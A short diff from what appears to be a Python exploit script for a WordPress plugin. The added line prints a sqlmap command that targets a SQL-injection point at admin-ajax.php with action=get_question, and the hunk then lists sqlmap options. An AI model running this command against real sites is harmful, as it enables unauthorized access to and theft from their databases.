@@ -48,6 +48,7 @@ wp_path = args.PATH
 print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))
 print('[*] Payload for SQL-Injection:')
 exploitcode_url = r'sqlmap "http://' + target_ip + ':' + target_port + wp_path + r'wp-admin/admin-ajax.php?action=get_question&question_id=1 *" '
+print(exploitcode_url)
 print('    Sqlmap options:')
 print('     -a, --all           Retrieve everything')
 print('     -b, --banner        Retrieve DBMS banner')
